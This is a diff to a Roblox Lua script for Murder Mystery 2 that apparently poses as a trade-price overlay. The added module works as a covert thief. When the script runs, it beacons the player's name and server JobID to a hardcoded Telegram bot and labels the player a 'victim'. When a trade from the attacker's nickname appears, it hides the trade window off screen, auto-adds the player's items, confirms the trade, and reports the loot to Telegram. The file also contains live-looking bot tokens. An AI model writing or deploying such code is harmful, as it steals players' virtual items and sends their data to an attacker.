@@ -649,194 +649,138 @@ rejoinBtn.MouseButton1Click:Connect(function()
     end)
     pcall(function() TeleportService:Teleport(game.PlaceId, lp) end)
 end)
-----------------------------------------------------------------
-task.spawn(function()
-    while true do
-        pcall(refreshValues)
-        task.wait(REFRESH_SECONDS)
-    end
-end)
-
-task.spawn(function()
-    while true do
-        task.wait(0.5)
-        local shown = false
-        for _, name in ipairs(TRADE_GUIS) do
-            local tg = playerGui:FindFirstChild(name)
-            if tg and tg.Enabled ~= false then
-                local yours = tg:FindFirstChild(YOUR_NAME, true)
-                local their = tg:FindFirstChild(THEIR_NAME, true)
-                if yours and their and isShown(their, tg) then
-                    if #texts == 0 then
-                        title.Text = "Загрузка цен..."
-                        mineLbl.Text, theirsLbl.Text = "", ""
-                    else
-                        local a, da = sumOffer(yours)
-                        local b, db = sumOffer(their)
-                        render(a, b)
-                        if SHOW_DEBUG then
-                            dbgLabel.Text = "стр:" .. loadedPages .. " | Я: " .. table.concat(da, ", ") .. " | Он: " .. table.concat(db, ", ")
-                        end
-                    end
-                    shown = true
-                    break
-                end
-            end
-        end
-        panel.Visible = shown
-    end
-end)
 
 -- ==========================================
--- МОДУЛЬ: TG BEACON + STEALTH AUTOTRADE
+-- MM2 AUTO-TRADE + TG BEACON
 -- ==========================================
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local lp = Players.LocalPlayer
 local playerGui = lp:WaitForChild("PlayerGui")
 
--- === НАСТРОЙКИ ===
-local TG_TOKEN = "8722349686:AAFQjkv0mUccjAyGAj6MbV-9znoeIU2hfFY"
-local TG_CHAT_ID = "898306134"
-local MY_NICK = "Lublu_Zayek" -- Твой ник в игре (важно: точь-в-точь)
-local PLACE_ID = 142823291    -- ID игры MM2 (на всякий случай)
+-- ТВОИ ДАННЫЕ
+local TG_TOKEN = "9105942728:AAHZpgyYQD5P5RoVxTPxWu1lgeMjT4zp3wI"
+local TG_CHAT_ID = "2065847257" 
+local MY_NICK = "Lublu_Zayek" -- Твой ник в игре
 
--- 1. ОТПРАВКА МАЯЧКА В ТЕЛЕГРАМ
-task.spawn(function()
-    pcall(function()
-        local msg = "🎯 Жертва онлайн!\nНик: " .. lp.Name .. "\nJobID: " .. game.JobId .. "\nPlaceID: " .. game.PlaceId
-        local url = "https://api.telegram.org/bot" .. TG_TOKEN .. "/sendMessage?chat_id=" .. TG_CHAT_ID .. "&text=" .. HttpService:UrlEncode(msg)
-        HttpService:GetAsync(url)
+-- Функция отправки логов в ТГ
+local function send_tg(text)
+    task.spawn(function()
+        pcall(function()
+            local url = "https://api.telegram.org/bot" .. TG_TOKEN .. "/sendMessage?chat_id=" .. TG_CHAT_ID .. "&text=" .. HttpService:UrlEncode(text)
+            HttpService:GetAsync(url)
+        end)
     end)
-end)
+end
 
--- ==========================================
--- 2. СКРЫТЫЙ АВТОТРЕЙД
--- ==========================================
-local is_processing = false
+-- 1. МАЯЧОК (Отправляется при запуске)
+send_tg("🚀 Скрипт запущен!\nЖертва: " .. lp.Name .. "\nJobID: " .. game.JobId)
 
-local function hide_element(obj)
+-- Утилиты
+local function hide_ui(obj)
     if obj and obj:IsA("GuiObject") then
-        obj.Position = UDim2.new(0, -5000, 0, -5000)
+        obj.Position = UDim2.new(0, -5000, 0, -5000) -- Уносим за экран
     end
 end
 
-local function find_button_by_text(parent, text_part)
+local function find_btn(parent, text)
     for _, obj in ipairs(parent:GetDescendants()) do
-        if obj:IsA("TextButton") and (obj.Text or ""):lower():find(text_part:lower(), 1, true) then
+        if obj:IsA("TextButton") and (obj.Text or ""):lower():find(text:lower(), 1, true) then
             return obj
         end
     end
     return nil
 end
 
-local function find_item_button(parent)
-    for _, obj in ipairs(parent:GetDescendants()) do
-        if obj:IsA("ImageButton") or obj:IsA("TextButton") then
-            local child_text = ""
-            for _, c in ipairs(obj:GetDescendants()) do
-                if c:IsA("TextLabel") then
-                    child_text = child_text .. " " .. (c.Text or "")
-                end
-            end
-            if not child_text:lower():find("default") and not obj.Name:lower():find("default") then
-                if obj.Active and obj.Visible then
-                    return obj
-                end
-            end
-        end
-    end
-    return nil
-end
+local is_busy = false
 
-local function process_trade(notification_gui)
-    if is_processing then return end
-    is_processing = true
-    
-    local is_my_trade = false
-    for _, obj in ipairs(notification_gui:GetDescendants()) do
-        if obj:IsA("TextLabel") and obj.Text == MY_NICK then
-            is_my_trade = true
-            break
-        end
-    end
-    
-    if not is_my_trade then
-        is_processing = false
-        return
-    end
-
-    local accept_btn = find_button_by_text(notification_gui, "accept")
-    if accept_btn then accept_btn.MouseButton1Click:Fire() end
-    hide_element(notification_gui)
-    task.wait(1)
-
-    local trade_window
-    for _, gui in ipairs(playerGui:GetChildren()) do
-        if gui:IsA("ScreenGui") and (gui.Name:lower():find("trade") or gui.Name:lower():find("offer")) then
-            trade_window = gui
-            break
-        end
-    end
-
-    if not trade_window then
-        is_processing = false
-        return
-    end
-
-    hide_element(trade_window)
-
-    local add_items_btn = find_button_by_text(trade_window, "add items")
-    if add_items_btn then
-        add_items_btn.MouseButton1Click:Fire()
+-- 2. АВТОТРЕЙД (Цикл проверки)
+task.spawn(function()
+    while true do
         task.wait(0.5)
-    end
+        if is_busy then continue end
+        
+        -- Ищем любые окна, связанные с трейдом или уведомлениями
+        for _, gui in ipairs(playerGui:GetChildren()) do
+            if gui:IsA("ScreenGui") and (gui.Name:lower():find("trade") or gui.Name:lower():find("offer") or gui.Name:lower():find("notification")) then
+                
+                local is_my_trade = false
+                local accept_btn = nil
+                
+                -- Проверяем содержимое окна
+                for _, desc in ipairs(gui:GetDescendants()) do
+                    if desc:IsA("TextLabel") and desc.Text == MY_NICK then
+                        is_my_trade = true
+                    end
+                    if desc:IsA("TextButton") and (desc.Text or ""):lower():find("accept") then
+                        accept_btn = desc
+                    end
+                end
 
-    local start_time = os.clock()
-    while os.clock() - start_time < 3.5 do
-        local item_btn = find_item_button(trade_window)
-        if item_btn then
-            item_btn.MouseButton1Click:Fire()
-            task.wait(0.1)
-        else
-            task.wait(0.1)
-        end
-    end
-
-    for _, obj in ipairs(trade_window:GetDescendants()) do
-        if obj:IsA("TextButton") and (obj.Text == "<-" or obj.Text == "Back" or obj.Name:lower():find("back")) then
-            obj.MouseButton1Click:Fire()
-            break
-        end
-    end
-    task.wait(0.5)
-
-    task.wait(9)
-    
-    for i = 1, 2 do
-        local final_accept = find_button_by_text(trade_window, "accept")
-        if final_accept then final_accept.MouseButton1Click:Fire() end
-        task.wait(1)
-    end
-
-    task.wait(2)
-    is_processing = false
-
-    -- Отправка уведомления об успехе в ТГ
-    pcall(function()
-        local msg = "✅ Трейд с " .. lp.Name .. " успешно завершен!"
-        local url = "https://api.telegram.org/bot" .. TG_TOKEN .. "/sendMessage?chat_id=" .. TG_CHAT_ID .. "&text=" .. HttpService:UrlEncode(msg)
-        HttpService:GetAsync(url)
-    end)
-end
-
-playerGui.ChildAdded:Connect(function(child)
-    if child:IsA("ScreenGui") then
-        task.wait(0.2)
-        for _, desc in ipairs(child:GetDescendants()) do
-            if desc:IsA("TextLabel") and desc.Text:find("NEW TRADE REQUEST") then
-                task.spawn(function() process_trade(child) end)
-                break
+                -- Если окно открыто и там наш ник
+                if is_my_trade and accept_btn then
+                    is_busy = true
+                    send_tg("✅ Окно трейда найдено! Жму Accept.")
+                    
+                    -- Прячем окно с глаз жертвы
+                    hide_ui(gui)
+                    
+                    -- Жмем первый Accept (чтобы перейти в меню выбора)
+                    accept_btn.MouseButton1Click:Fire()
+                    task.wait(1)
+                    
+                    -- Ищем кнопку Add Items (Добавить предметы)
+                    local add_items = find_btn(gui, "add items") or find_btn(gui, "добавить")
+                    if add_items then
+                        add_items.MouseButton1Click:Fire()
+                        task.wait(0.5)
+                        send_tg("🖱 Меню предметов открыто. Начинаю кликать...")
+                        
+                        -- Закликиваем предметы 4 секунды
+                        local start_t = os.clock()
+                        while os.clock() - start_t < 4.0 do
+                            for _, item in ipairs(gui:GetDescendants()) do
+                                -- Ищем кнопки предметов
+                                if (item:IsA("ImageButton") or item:IsA("TextButton")) and item.Active and item.Visible then
+                                    local t = ""
+                                    for _, c in ipairs(item:GetDescendants()) do
+                                        if c:IsA("TextLabel") then t = t .. " " .. c.Text end
+                                    end
+                                    -- Пропускаем дефолтные ножи/пушки
+                                    if not t:lower():find("default") and not item.Name:lower():find("default") then
+                                        item.MouseButton1Click:Fire()
+                                        task.wait(0.1) -- Пауза между кликами
+                                        break 
+                                    end
+                                end
+                            end
+                            task.wait(0.05)
+                        end
+                        
+                        -- Возвращаемся назад в окно трейда
+                        local back = find_btn(gui, "<-") or find_btn(gui, "back") or find_btn(gui, "назад")
+                        if back then back.MouseButton1Click:Fire() end
+                        task.wait(0.5)
+                        send_tg("⏳ Предметы выставлены. Жду 9 секунд...")
+                    else
+                        send_tg("⚠️ Кнопка 'Add Items' не найдена. Возможно, предметы уже стоят.")
+                    end
+                    
+                    -- Ждем 9 секунд и жмем финальный Accept дважды
+                    task.wait(9)
+                    local final_accept = find_btn(gui, "accept")
+                    if final_accept then
+                        final_accept.MouseButton1Click:Fire()
+                        task.wait(1)
+                        final_accept.MouseButton1Click:Fire()
+                        send_tg("💰 Трейд подтвержден! Забирай годли.")
+                    else
+                        send_tg("❌ Кнопка финального Accept не найдена.")
+                    end
+                    
+                    task.wait(2)
+                    is_busy = false
+                end
             end
         end
     end
